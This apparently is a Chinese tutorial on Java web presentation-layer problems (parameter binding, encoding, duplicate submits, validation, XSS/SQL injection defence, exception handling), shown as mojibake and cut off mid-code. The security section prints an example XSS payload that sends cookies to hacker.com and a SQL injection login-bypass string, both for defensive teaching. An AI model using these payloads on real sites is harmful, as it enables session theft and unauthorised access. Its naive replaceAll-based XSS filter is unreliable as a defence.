---
title: 4ã€è¡¨ç°å±‚å¸¸è§é—®é¢˜å¤„ç†
---
## ğŸ“š ç›®å½•

1. [å‚æ•°è§£æé—®é¢˜å¤„ç†](#1-å‚æ•°è§£æé—®é¢˜å¤„ç†)
2. [ä¸­æ–‡ä¹±ç é—®é¢˜è§£å†³](#2-ä¸­æ–‡ä¹±ç é—®é¢˜è§£å†³)
3. [é˜²æ­¢é‡å¤æäº¤æœºåˆ¶](#3-é˜²æ­¢é‡å¤æäº¤æœºåˆ¶)
4. [è¾“å…¥æ•°æ®æ ¡éªŒ](#4-è¾“å…¥æ•°æ®æ ¡éªŒ)
5. [å®‰å…¨è¿‡æ»¤é˜²æŠ¤](#5-å®‰å…¨è¿‡æ»¤é˜²æŠ¤)
6. [å¼‚å¸¸ç»Ÿä¸€å¤„ç†](#6-å¼‚å¸¸ç»Ÿä¸€å¤„ç†)
7. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#7-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ”§ å‚æ•°è§£æé—®é¢˜å¤„ç†


### 1.1 ä»€ä¹ˆæ˜¯å‚æ•°è§£æé—®é¢˜


**ç®€å•ç†è§£**ï¼šå½“ç”¨æˆ·åœ¨ç½‘é¡µä¸Šå¡«å†™è¡¨å•æˆ–ç‚¹å‡»é“¾æ¥æ—¶ï¼Œè¿™äº›æ•°æ®éœ€è¦ä¼ é€’åˆ°åç«¯ç¨‹åºã€‚ä½†æ˜¯è¿™ä¸ªä¼ é€’è¿‡ç¨‹ä¸­ç»å¸¸ä¼šå‡ºç°å„ç§é—®é¢˜ï¼Œæ¯”å¦‚æ•°æ®æ ¼å¼ä¸å¯¹ã€å‚æ•°åä¸åŒ¹é…ç­‰ã€‚

```
ç”¨æˆ·æ“ä½œæµç¨‹ï¼š
ç½‘é¡µè¡¨å• â†’ æäº¤æ•°æ® â†’ Controlleræ¥æ”¶ â†’ è½¬æ¢æˆJavaå¯¹è±¡

å¸¸è§é—®é¢˜ï¼š
âŒ å‰ç«¯å‚æ•°å: "userName"ï¼Œåç«¯æ¥æ”¶: "user_name" (ä¸åŒ¹é…)
âŒ å‰ç«¯ä¼ : "2023-12-01"ï¼Œåç«¯æœŸæœ›: Dateç±»å‹ (ç±»å‹è½¬æ¢å¤±è´¥)
âŒ å‰ç«¯ä¼ : "abc"ï¼Œåç«¯æœŸæœ›: Integerç±»å‹ (æ•°å­—è½¬æ¢å¤±è´¥)
```

### 1.2 å‚æ•°åä¸åŒ¹é…è§£å†³æ–¹æ¡ˆ


**é—®é¢˜ç°è±¡**ï¼šå‰ç«¯è¡¨å•å­—æ®µåå’Œåç«¯å‚æ•°åä¸ä¸€è‡´

**ğŸ’¡ è§£å†³æ–¹æ³•**ï¼š

**æ–¹æ³•ä¸€ï¼šç»Ÿä¸€å‘½åè§„èŒƒ**
```java
// å‰ç«¯è¡¨å•
<input name="userName" value="å¼ ä¸‰">
<input name="userAge" value="25">

// åç«¯Controller - ç›´æ¥åŒ¹é…
@RequestMapping("/saveUser")
public String saveUser(String userName, Integer userAge) {
    System.out.println("ç”¨æˆ·å: " + userName); // è¾“å‡º: å¼ ä¸‰
    System.out.println("å¹´é¾„: " + userAge);   // è¾“å‡º: 25
    return "success";
}
```

**æ–¹æ³•äºŒï¼šä½¿ç”¨@RequestParamæ³¨è§£**
```java
// å½“å‚æ•°åä¸ä¸€è‡´æ—¶ä½¿ç”¨æ³¨è§£æŒ‡å®š
@RequestMapping("/saveUser")
public String saveUser(
    @RequestParam("user_name") String userName,  // å‰ç«¯ç”¨user_nameï¼Œåç«¯ç”¨userName
    @RequestParam("user_age") Integer userAge
) {
    // å¤„ç†é€»è¾‘...
    return "success";
}
```

### 1.3 ç±»å‹è½¬æ¢é—®é¢˜å¤„ç†


**å¸¸è§ç±»å‹è½¬æ¢åœºæ™¯**ï¼š

| å‰ç«¯æ•°æ®ç±»å‹ | åç«¯Javaç±»å‹ | è½¬æ¢è¯´æ˜ |
|-------------|-------------|----------|
| `"123"` | `Integer` | **è‡ªåŠ¨è½¬æ¢**ï¼Œæ— éœ€å¤„ç† |
| `"2023-12-01"` | `Date` | **éœ€è¦æ ¼å¼åŒ–å™¨** |
| `"true"` | `Boolean` | **è‡ªåŠ¨è½¬æ¢** |
| `"1,2,3"` | `List<Integer>` | **éœ€è¦è‡ªå®šä¹‰è½¬æ¢** |

**æ—¥æœŸç±»å‹è½¬æ¢ç¤ºä¾‹**ï¼š
```java
// æ–¹æ³•ä¸€ï¼šä½¿ç”¨@DateTimeFormatæ³¨è§£
@RequestMapping("/saveUser")
public String saveUser(
    String userName,
    @DateTimeFormat(pattern = "yyyy-MM-dd") Date birthday
) {
    // Springä¼šè‡ªåŠ¨å°†"2023-12-01"è½¬æ¢ä¸ºDateå¯¹è±¡
    return "success";
}

// æ–¹æ³•äºŒï¼šå­—ç¬¦ä¸²æ¥æ”¶åæ‰‹åŠ¨è½¬æ¢
@RequestMapping("/saveUser")
public String saveUser(String userName, String birthday) {
    try {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");
        Date date = sdf.parse(birthday);
        // ç»§ç»­å¤„ç†...
    } catch (ParseException e) {
        // è½¬æ¢å¤±è´¥å¤„ç†
        return "error";
    }
    return "success";
}
```

### 1.4 å¤æ‚å¯¹è±¡å‚æ•°ç»‘å®š


**ä»€ä¹ˆæ˜¯å¯¹è±¡ç»‘å®š**ï¼šå°†å¤šä¸ªç›¸å…³å‚æ•°è‡ªåŠ¨å°è£…æˆä¸€ä¸ªJavaå¯¹è±¡

```java
// ç”¨æˆ·å®ä½“ç±»
public class User {
    private String userName;
    private Integer age;
    private String email;
    
    // getterå’Œsetteræ–¹æ³•...
}

// Controllerä¸­ç›´æ¥æ¥æ”¶å¯¹è±¡
@RequestMapping("/saveUser")
public String saveUser(User user) {
    // Springä¼šè‡ªåŠ¨å°†è¡¨å•å‚æ•°å°è£…æˆUserå¯¹è±¡
    System.out.println("ç”¨æˆ·ä¿¡æ¯: " + user.getUserName());
    return "success";
}
```

**å‰ç«¯è¡¨å•å¯¹åº”å†™æ³•**ï¼š
```html
<form action="/saveUser" method="post">
    å§“å: <input name="userName" value="å¼ ä¸‰">
    å¹´é¾„: <input name="age" value="25"> 
    é‚®ç®±: <input name="email" value="zhang@email.com">
    <input type="submit" value="æäº¤">
</form>
```

---

## 2. ğŸŒ ä¸­æ–‡ä¹±ç é—®é¢˜è§£å†³


### 2.1 ä¹±ç é—®é¢˜çš„æ ¹æœ¬åŸå› 


**ç®€å•ç†è§£**ï¼šè®¡ç®—æœºå†…éƒ¨ç”¨æ•°å­—æ¥è¡¨ç¤ºæ–‡å­—ï¼Œä¸åŒçš„ç¼–ç æ–¹å¼ç”¨ä¸åŒçš„æ•°å­—ä»£è¡¨åŒä¸€ä¸ªæ±‰å­—ã€‚å½“å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä½¿ç”¨çš„ç¼–ç ä¸ä¸€è‡´æ—¶ï¼Œå°±ä¼šå‡ºç°ä¹±ç ã€‚

```
ä¹±ç äº§ç”Ÿè¿‡ç¨‹ï¼š
æµè§ˆå™¨(UTF-8) â†’ "ä½ å¥½" â†’ ç½‘ç»œä¼ è¾“ â†’ æœåŠ¡å™¨(ISO-8859-1) â†’ "Ã¤Â½ Ã¥Â¥Â½"
     â†‘                                           â†‘
   æ­£ç¡®ç¼–ç                                     é”™è¯¯ç¼–ç 
```

### 2.2 GETè¯·æ±‚ä¹±ç è§£å†³


**é—®é¢˜åœºæ™¯**ï¼šç‚¹å‡»é“¾æ¥ä¼ é€’ä¸­æ–‡å‚æ•°æ—¶å‡ºç°ä¹±ç 

**ğŸ”§ è§£å†³æ–¹æ¡ˆ**ï¼š

**æ–¹æ³•ä¸€ï¼šTomcaté…ç½®ï¼ˆæ¨èï¼‰**
```xml
<!-- åœ¨server.xmlçš„Connectoræ ‡ç­¾ä¸­æ·»åŠ  -->
<Connector port="8080" protocol="HTTP/1.1"
           connectionTimeout="20000"
           redirectPort="8443"
           URIEncoding="UTF-8" />
```

**æ–¹æ³•äºŒï¼šä»£ç ä¸­æ‰‹åŠ¨è½¬æ¢**
```java
@RequestMapping("/search")
public String search(String keyword) {
    try {
        // æ‰‹åŠ¨è½¬æ¢ç¼–ç 
        keyword = new String(keyword.getBytes("ISO-8859-1"), "UTF-8");
        System.out.println("æœç´¢å…³é”®å­—: " + keyword);
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    }
    return "result";
}
```

### 2.3 POSTè¯·æ±‚ä¹±ç è§£å†³


**ğŸ› ï¸ è¿‡æ»¤å™¨è§£å†³æ–¹æ¡ˆ**ï¼š

```java
// åˆ›å»ºç¼–ç è¿‡æ»¤å™¨
public class CharacterEncodingFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        // è®¾ç½®è¯·æ±‚å’Œå“åº”çš„å­—ç¬¦ç¼–ç 
        request.setCharacterEncoding("UTF-8");
        response.setCharacterEncoding("UTF-8");
        response.setContentType("text/html;charset=UTF-8");
        
        // ç»§ç»­æ‰§è¡Œåç»­è¿‡æ»¤å™¨å’ŒServlet
        chain.doFilter(request, response);
    }
}
```

**web.xmlé…ç½®**ï¼š
```xml
<filter>
    <filter-name>CharacterEncodingFilter</filter-name>
    <filter-class>com.example.filter.CharacterEncodingFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>CharacterEncodingFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

### 2.4 å“åº”æ•°æ®ä¹±ç è§£å†³


```java
@RequestMapping("/getUserInfo")
public void getUserInfo(HttpServletResponse response) throws IOException {
    // è®¾ç½®å“åº”ç¼–ç 
    response.setContentType("application/json;charset=UTF-8");
    
    PrintWriter out = response.getWriter();
    out.print("{\"name\":\"å¼ ä¸‰\",\"age\":25}");
    out.close();
}
```

---

## 3. ğŸ”’ é˜²æ­¢é‡å¤æäº¤æœºåˆ¶


### 3.1 é‡å¤æäº¤é—®é¢˜åˆ†æ


**ä»€ä¹ˆæ˜¯é‡å¤æäº¤**ï¼šç”¨æˆ·åœ¨çŸ­æ—¶é—´å†…å¤šæ¬¡ç‚¹å‡»æäº¤æŒ‰é’®ï¼Œå¯¼è‡´åŒä¸€ä¸ªæ“ä½œè¢«æ‰§è¡Œå¤šæ¬¡ã€‚

**å¸¸è§åœºæ™¯**ï¼š
```
ç”¨æˆ·åœºæ™¯åˆ†æï¼š
1. ç½‘ç»œæ…¢ â†’ ç”¨æˆ·ä»¥ä¸ºæ²¡æäº¤ â†’ è¿ç»­ç‚¹å‡»æäº¤æŒ‰é’®
2. æµè§ˆå™¨åˆ·æ–° â†’ é‡æ–°æäº¤è¡¨å•æ•°æ®  
3. æµè§ˆå™¨åé€€ â†’ å†æ¬¡å‰è¿›æäº¤

å±å®³å½±å“ï¼š
âŒ æ•°æ®åº“æ’å…¥é‡å¤è®°å½•
âŒ é‡å¤æ‰£æ¬¾æˆ–ç§¯åˆ†
âŒ é‡å¤å‘é€é‚®ä»¶/çŸ­ä¿¡
âŒ æœåŠ¡å™¨æ€§èƒ½å‹åŠ›
```

### 3.2 å‰ç«¯é˜²é‡å¤æäº¤


**JavaScriptè§£å†³æ–¹æ¡ˆ**ï¼š
```html
<script>
// é˜²æ­¢æŒ‰é’®é‡å¤ç‚¹å‡»
function preventResubmit() {
    var submitBtn = document.getElementById("submitBtn");
    
    // ç¦ç”¨æŒ‰é’®å¹¶ä¿®æ”¹æ–‡å­—
    submitBtn.disabled = true;
    submitBtn.value = "æäº¤ä¸­...";
    
    // 3ç§’åé‡æ–°å¯ç”¨ï¼ˆå¯é€‰ï¼‰
    setTimeout(function() {
        submitBtn.disabled = false;
        submitBtn.value = "æäº¤";
    }, 3000);
}
</script>

<form action="/saveUser" method="post">
    å§“å: <input name="userName" value="å¼ ä¸‰">
    <input type="submit" id="submitBtn" value="æäº¤" onclick="preventResubmit()">
</form>
```

### 3.3 æœåŠ¡ç«¯Tokenæœºåˆ¶


**ğŸ”‘ Tokené˜²é‡å¤åŸç†**ï¼š
```
Tokenæœºåˆ¶æµç¨‹ï¼š
1. ç”¨æˆ·è®¿é—®è¡¨å•é¡µé¢ â†’ æœåŠ¡å™¨ç”Ÿæˆå”¯ä¸€Token â†’ å­˜å‚¨åˆ°Session
2. è¡¨å•æäº¤æ—¶æºå¸¦Token â†’ æœåŠ¡å™¨éªŒè¯Token â†’ éªŒè¯é€šè¿‡åˆ™å¤„ç†è¯·æ±‚
3. å¤„ç†å®Œæˆååˆ é™¤Token â†’ å†æ¬¡æäº¤æ—¶Tokenæ— æ•ˆ â†’ æ‹’ç»é‡å¤è¯·æ±‚
```

**å®ç°ä»£ç **ï¼š
```java
// ç”ŸæˆTokençš„å·¥å…·ç±»
public class TokenUtil {
    public static String generateToken() {
        return UUID.randomUUID().toString().replace("-", "");
    }
}

// æ˜¾ç¤ºè¡¨å•é¡µé¢æ—¶ç”ŸæˆToken
@RequestMapping("/showForm")
public String showForm(HttpSession session, Model model) {
    String token = TokenUtil.generateToken();
    session.setAttribute("token", token);
    model.addAttribute("token", token);
    return "userForm";
}

// å¤„ç†è¡¨å•æäº¤æ—¶éªŒè¯Token
@RequestMapping("/saveUser")
public String saveUser(String token, User user, HttpSession session) {
    // è·å–Sessionä¸­çš„Token
    String sessionToken = (String) session.getAttribute("token");
    
    if (sessionToken == null || !sessionToken.equals(token)) {
        return "error"; // Tokenæ— æ•ˆï¼Œå¯èƒ½æ˜¯é‡å¤æäº¤
    }
    
    // Tokenæœ‰æ•ˆï¼Œåˆ é™¤é¿å…é‡å¤ä½¿ç”¨
    session.removeAttribute("token");
    
    // æ­£å¸¸å¤„ç†ä¸šåŠ¡é€»è¾‘
    userService.saveUser(user);
    return "success";
}
```

**è¡¨å•é¡µé¢**ï¼š
```html
<form action="/saveUser" method="post">
    <!-- éšè—çš„Tokenå­—æ®µ -->
    <input type="hidden" name="token" value="${token}">
    
    å§“å: <input name="userName">
    <input type="submit" value="æäº¤">
</form>
```

---

## 4. âœ… è¾“å…¥æ•°æ®æ ¡éªŒ


### 4.1 ä¸ºä»€ä¹ˆéœ€è¦æ•°æ®æ ¡éªŒ


**æ•°æ®æ ¡éªŒçš„é‡è¦æ€§**ï¼š
```
ç”¨æˆ·è¾“å…¥çš„æ•°æ®åƒå¥‡ç™¾æ€ªï¼š
âŒ é‚®ç®±æ ¼å¼: "è¿™æ˜¯é‚®ç®±å—ï¼Ÿ"
âŒ æ‰‹æœºå·: "123"  
âŒ å¹´é¾„: "-100å²"
âŒ æ¶æ„è„šæœ¬: "<script>alert('hack')</script>"

ä¸æ ¡éªŒçš„åæœï¼š
ğŸ’¥ æ•°æ®åº“æ•°æ®æ··ä¹±
ğŸ’¥ ç¨‹åºè¿è¡Œå¼‚å¸¸
ğŸ’¥ å®‰å…¨æ¼æ´è¢«åˆ©ç”¨
```

### 4.2 å‰ç«¯æ ¡éªŒå®ç°


**HTML5å†…ç½®æ ¡éªŒ**ï¼š
```html
<form action="/register" method="post">
    é‚®ç®±: <input type="email" name="email" required 
              placeholder="è¯·è¾“å…¥æœ‰æ•ˆé‚®ç®±">
    
    æ‰‹æœº: <input type="tel" name="phone" required
              pattern="^1[3-9]\d{9}$" 
              title="è¯·è¾“å…¥11ä½æ‰‹æœºå·">
    
    å¹´é¾„: <input type="number" name="age" required
              min="1" max="150" 
              placeholder="1-150å²">
              
    <input type="submit" value="æ³¨å†Œ">
</form>
```

**JavaScriptè‡ªå®šä¹‰æ ¡éªŒ**ï¼š
```html
<script>
function validateForm() {
    var email = document.forms["registerForm"]["email"].value;
    var phone = document.forms["registerForm"]["phone"].value;
    
    // é‚®ç®±æ ¼å¼æ ¡éªŒ
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");
        return false;
    }
    
    // æ‰‹æœºå·æ ¡éªŒ
    var phoneRegex = /^1[3-9]\d{9}$/;
    if (!phoneRegex.test(phone)) {
        alert("æ‰‹æœºå·æ ¼å¼ä¸æ­£ç¡®");
        return false;
    }
    
    return true;
}
</script>
```

### 4.3 æœåŠ¡ç«¯æ ¡éªŒå®ç°


**âš ï¸ é‡è¦åŸåˆ™**ï¼šå‰ç«¯æ ¡éªŒåªæ˜¯ç”¨æˆ·ä½“éªŒï¼ŒæœåŠ¡ç«¯æ ¡éªŒæ‰æ˜¯å®‰å…¨ä¿éšœï¼

**åŸºç¡€æ ¡éªŒæ–¹æ³•**ï¼š
```java
@RequestMapping("/register")
public String register(User user, Model model) {
    List<String> errors = new ArrayList<>();
    
    // ç”¨æˆ·åæ ¡éªŒ
    if (user.getUserName() == null || user.getUserName().trim().length() == 0) {
        errors.add("ç”¨æˆ·åä¸èƒ½ä¸ºç©º");
    } else if (user.getUserName().length() < 2 || user.getUserName().length() > 20) {
        errors.add("ç”¨æˆ·åé•¿åº¦ä¸º2-20ä½");
    }
    
    // é‚®ç®±æ ¼å¼æ ¡éªŒ
    String emailRegex = "^[A-Za-z0-9+_.-]+@(.+)$";
    if (user.getEmail() == null || !user.getEmail().matches(emailRegex)) {
        errors.add("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");
    }
    
    // å¹´é¾„æ ¡éªŒ
    if (user.getAge() == null || user.getAge() < 1 || user.getAge() > 150) {
        errors.add("å¹´é¾„å¿…é¡»åœ¨1-150ä¹‹é—´");
    }
    
    // å¦‚æœæœ‰é”™è¯¯ï¼Œè¿”å›è¡¨å•é¡µé¢
    if (!errors.isEmpty()) {
        model.addAttribute("errors", errors);
        model.addAttribute("user", user); // ä¿æŒç”¨æˆ·è¾“å…¥
        return "register"; // è¿”å›æ³¨å†Œé¡µé¢
    }
    
    // æ ¡éªŒé€šè¿‡ï¼Œä¿å­˜ç”¨æˆ·
    userService.saveUser(user);
    return "success";
}
```

### 4.4 æ ¡éªŒå·¥å…·ç±»å°è£…


```java
public class ValidationUtil {
    
    // é‚®ç®±æ ¼å¼æ ¡éªŒ
    public static boolean isValidEmail(String email) {
        if (email == null) return false;
        return email.matches("^[A-Za-z0-9+_.-]+@(.+)$");
    }
    
    // æ‰‹æœºå·æ ¡éªŒ
    public static boolean isValidPhone(String phone) {
        if (phone == null) return false;
        return phone.matches("^1[3-9]\\d{9}$");
    }
    
    // å­—ç¬¦ä¸²é•¿åº¦æ ¡éªŒ
    public static boolean isValidLength(String str, int min, int max) {
        if (str == null) return false;
        int len = str.trim().length();
        return len >= min && len <= max;
    }
    
    // æ•°å­—èŒƒå›´æ ¡éªŒ
    public static boolean isInRange(Integer num, int min, int max) {
        if (num == null) return false;
        return num >= min && num <= max;
    }
}
```

---

## 5. ğŸ›¡ï¸ å®‰å…¨è¿‡æ»¤é˜²æŠ¤


### 5.1 å¸¸è§Webå®‰å…¨å¨èƒ


**Webåº”ç”¨é¢ä¸´çš„ä¸»è¦å¨èƒ**ï¼š

| æ”»å‡»ç±»å‹ | **æ”»å‡»åŸç†** | **å±å®³åæœ** | **é˜²æŠ¤é‡ç‚¹** |
|---------|-------------|-------------|-------------|
| **XSSæ”»å‡»** | `æ¶æ„è„šæœ¬æ³¨å…¥` | `ç›—å–ç”¨æˆ·ä¿¡æ¯` | `è¾“å‡ºç¼–ç ` |
| **SQLæ³¨å…¥** | `æ¶æ„SQLè¯­å¥` | `æ•°æ®åº“æ³„éœ²` | `å‚æ•°åŒ–æŸ¥è¯¢` |
| **CSRFæ”»å‡»** | `ä¼ªé€ ç”¨æˆ·è¯·æ±‚` | `è¶Šæƒæ“ä½œ` | `TokenéªŒè¯` |
| **æ–‡ä»¶ä¸Šä¼ ** | `ä¸Šä¼ æ¶æ„æ–‡ä»¶` | `æœåŠ¡å™¨è¢«æ§åˆ¶` | `æ–‡ä»¶ç±»å‹é™åˆ¶` |

### 5.2 XSSæ”»å‡»é˜²æŠ¤


**ä»€ä¹ˆæ˜¯XSSæ”»å‡»**ï¼šæ”»å‡»è€…åœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„è„šæœ¬ä»£ç ï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®æ—¶æ‰§è¡Œè¿™äº›ä»£ç ã€‚

**æ”»å‡»ç¤ºä¾‹**ï¼š
```html
<!-- ç”¨æˆ·åœ¨ç•™è¨€æ¿è¾“å…¥æ¶æ„è„šæœ¬ -->
<script>
    // ç›—å–ç”¨æˆ·Cookie
    document.location='http://hacker.com/steal.php?cookie='+document.cookie;
</script>
```

**ğŸ” é˜²æŠ¤æªæ–½**ï¼š

**æ–¹æ³•ä¸€ï¼šHTMLå®ä½“ç¼–ç **
```java
public class XSSUtil {
    public static String encode(String input) {
        if (input == null) return null;
        
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            switch (c) {
                case '<': sb.append("&lt;"); break;
                case '>': sb.append("&gt;"); break;
                case '&': sb.append("&amp;"); break;
                case '"': sb.append("&quot;"); break;
                case '\'': sb.append("&#x27;"); break;
                default: sb.append(c);
            }
        }
        return sb.toString();
    }
}

// Controllerä¸­ä½¿ç”¨
@RequestMapping("/saveComment")
public String saveComment(String content) {
    // å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œç¼–ç 
    String safeContent = XSSUtil.encode(content);
    commentService.saveComment(safeContent);
    return "success";
}
```

**æ–¹æ³•äºŒï¼šXSSè¿‡æ»¤å™¨**
```java
public class XSSFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        // åŒ…è£…è¯·æ±‚ï¼Œè¿‡æ»¤å±é™©å­—ç¬¦
        XSSRequestWrapper wrappedRequest = new XSSRequestWrapper(
            (HttpServletRequest) request);
        
        chain.doFilter(wrappedRequest, response);
    }
}

// è¯·æ±‚åŒ…è£…ç±»
class XSSRequestWrapper extends HttpServletRequestWrapper {
    
    public XSSRequestWrapper(HttpServletRequest request) {
        super(request);
    }
    
    @Override
    public String getParameter(String parameter) {
        String value = super.getParameter(parameter);
        return cleanXSS(value);
    }
    
    private String cleanXSS(String value) {
        if (value == null) return null;
        
        // ç§»é™¤å¸¸è§çš„XSSæ”»å‡»å­—ç¬¦
        value = value.replaceAll("<script", "&lt;script");
        value = value.replaceAll("</script>", "&lt;/script&gt;");
        value = value.replaceAll("javascript:", "");
        value = value.replaceAll("onclick", "");
        
        return value;
    }
}
```

### 5.3 SQLæ³¨å…¥é˜²æŠ¤


**ä»€ä¹ˆæ˜¯SQLæ³¨å…¥**ï¼šæ”»å‡»è€…é€šè¿‡è¾“å…¥æ¶æ„SQLä»£ç ï¼Œæ”¹å˜åŸæœ¬çš„SQLè¯­å¥é€»è¾‘ã€‚

**å±é™©ç¤ºä¾‹**ï¼š
```java
// å±é™©çš„æ‹¼æ¥SQLæ–¹å¼
String sql = "SELECT * FROM users WHERE name='" + userName + "' AND password='" + password + "'";

// å¦‚æœç”¨æˆ·è¾“å…¥: userName = "admin' --"
// æœ€ç»ˆSQLå˜æˆ: SELECT * FROM users WHERE name='admin' --' AND password='xxx'
// æ³¨é‡Šæ‰äº†å¯†ç æ£€æŸ¥ï¼Œç›´æ¥ä»¥adminèº«ä»½ç™»å½•ï¼
```

**ğŸ›¡ï¸ å®‰å…¨é˜²æŠ¤**ï¼š
```java
// ä½¿ç”¨PreparedStatementé˜²æ­¢SQLæ³¨å…¥
public User login(String userName, String password) {
    String sql = "SELECT * FROM users WHERE name=? AND password=?";
    
    try (PreparedStatement pstmt = connection.prepareStatement(sql)) {
        pstmt.setString(1, userName);  // å‚æ•°åŒ–è®¾ç½®ï¼Œè‡ªåŠ¨è½¬ä¹‰
        pstmt.setString(2, password);
        
        ResultSet rs = pstmt.executeQuery();
        // å¤„ç†ç»“æœ...
    } catch (SQLException e) {
        e.printStackTrace();
    }
    return null;
}
```

### 5.4 è®¿é—®æ§åˆ¶ä¸æƒé™æ ¡éªŒ


**ç®€å•çš„æƒé™æ§åˆ¶è¿‡æ»¤å™¨**ï¼š
```java
public class AuthFilter implements Filter {
    
    // ä¸éœ€è¦ç™»å½•çš„é¡µé¢
    private Set<String> publicUrls = Set.of("/login", "/register", "/index");
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        
        String uri = req.getRequestURI();
        
        // æ£€æŸ¥æ˜¯å¦ä¸ºå…¬å¼€é¡µé¢
        if (isPublicUrl(uri)) {
            chain.doFilter(request, response);
            return;
        }
        
        // æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•
        HttpSession session = req.getSession();
        Object user = session.getAttribute("user");
        
        if (user == null) {
            // æœªç™»å½•ï¼Œè·³è½¬åˆ°ç™»å½•é¡µé¢
            resp.sendRedirect("/login");
            return;
        }
        
        // å·²ç™»å½•ï¼Œç»§ç»­è®¿é—®
        chain.doFilter(request, response);
    }
    
    private boolean isPublicUrl(String uri) {
        return publicUrls.contains(uri) || uri.contains("/static/");
    }
}
```

---

## 6. âš ï¸ å¼‚å¸¸ç»Ÿä¸€å¤„ç†


### 6.1 ä¸ºä»€ä¹ˆéœ€è¦å¼‚å¸¸ç»Ÿä¸€å¤„ç†


**æ²¡æœ‰å¼‚å¸¸å¤„ç†çš„é—®é¢˜**ï¼š
```
ç”¨æˆ·æ“ä½œæµç¨‹ä¸­çš„é—®é¢˜ï¼š
ç”¨æˆ·æäº¤è¡¨å• â†’ æ•°æ®åº“è¿æ¥å¤±è´¥ â†’ é¡µé¢æ˜¾ç¤º500é”™è¯¯ â†’ ç”¨æˆ·ä¸€è„¸æ‡µ

å¼€å‘è°ƒè¯•ä¸­çš„é—®é¢˜ï¼š
å¼‚å¸¸ä¿¡æ¯æ•£è½åœ¨å„ä¸ªController â†’ å¤„ç†æ–¹å¼ä¸ä¸€è‡´ â†’ ç»´æŠ¤å›°éš¾
```

**ç»Ÿä¸€å¼‚å¸¸å¤„ç†çš„å¥½å¤„**ï¼š
- âœ… **ç”¨æˆ·ä½“éªŒå¥½** - å‹å¥½çš„é”™è¯¯æç¤ºé¡µé¢
- âœ… **ä»£ç æ•´æ´** - Controllerä¸“æ³¨ä¸šåŠ¡é€»è¾‘
- âœ… **ç»´æŠ¤æ–¹ä¾¿** - é›†ä¸­ç®¡ç†æ‰€æœ‰å¼‚å¸¸
- âœ… **æ—¥å¿—å®Œæ•´** - ç»Ÿä¸€è®°å½•å¼‚å¸¸ä¿¡æ¯

### 6.2 å…¨å±€å¼‚å¸¸å¤„ç†å™¨å®ç°


```java
// å…¨å±€å¼‚å¸¸å¤„ç†å™¨
public class GlobalExceptionHandler implements HandlerExceptionResolver {
    
    @Override
    public ModelAndView resolveException(HttpServletRequest request, 
                                       HttpServletResponse response, 
                                       Object handler, Exception ex) {
        
        ModelAndView mv = new ModelAndView();
        
        // æ ¹æ®å¼‚å¸¸ç±»å‹è¿›è¡Œä¸åŒå¤„ç†
        if (ex instanceof NullPointerException) {
            mv.setViewName("error/null_pointer");
            mv.addObject("message", "ç³»ç»Ÿå‡ºç°ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œè¯·è”ç³»ç®¡ç†å‘˜");
            
        } else if (ex instanceof SQLException) {
            mv.setViewName("error/database_error");  
            mv.addObject("message", "æ•°æ®åº“æ“ä½œå¤±è´¥ï¼Œè¯·ç¨åé‡è¯•");
            
        } else if (ex instanceof IllegalArgumentException) {
            mv.setViewName("error/param_error");
            mv.addObject("message", "å‚æ•°é”™è¯¯ï¼š" + ex.getMessage());
            
        } else {
            // å…¶ä»–æœªçŸ¥å¼‚å¸¸
            mv.setViewName("error/system_error");
            mv.addObject("message", "ç³»ç»Ÿç¹å¿™ï¼Œè¯·ç¨åé‡è¯•");
        }
        
        // è®°å½•å¼‚å¸¸æ—¥å¿—
        logException(request, ex);
        
        return mv;
    }
    
    private void logException(HttpServletRequest request, Exception ex) {
        System.err.println("=== å¼‚å¸¸ä¿¡æ¯ ===");
        System.err.println("è¯·æ±‚URL: " + request.getRequestURL());
        System.err.println("å¼‚å¸¸ç±»å‹: " + ex.getClass().getSimpleName());
        System.err.println("å¼‚å¸¸ä¿¡æ¯: " + ex.getMessage());
        ex.printStackTrace();
    }
}
```

**Springé…ç½®**ï¼š
```xml
<!-- åœ¨Springé…ç½®æ–‡ä»¶ä¸­æ³¨å†Œå¼‚å¸¸å¤„ç†å™¨ -->
<bean class="com.example.exception.GlobalExceptionHandler"/>
```

### 6.3 è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸


**å®šä¹‰ä¸šåŠ¡å¼‚å¸¸ç±»**ï¼š
```java
// è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸
public class BusinessException extends RuntimeException {
    private String errorCode;
    private String errorMessage;
    
    public BusinessException(String errorCode, String errorMessage) {
        super(errorMessage);
        this.errorCode = errorCode;
        this.errorMessage = errorMessage;
    }
    
    // getteræ–¹æ³•...
}

// ç”¨æˆ·ç›¸å…³å¼‚å¸¸
public class UserException extends BusinessException {
    public UserException(String message) {
        super("USER_ERROR", message);
    }
}
```

**ä¸šåŠ¡ä»£ç ä¸­ä½¿ç”¨**ï¼š
```java
@RequestMapping("/login")
public String login(String userName, String password) {
    // å‚æ•°æ ¡éªŒ
    if (userName == null || userName.trim().isEmpty()) {
        throw new UserException("ç”¨æˆ·åä¸èƒ½ä¸ºç©º");
    }
    
    if (password == null || password.trim().isEmpty()) {
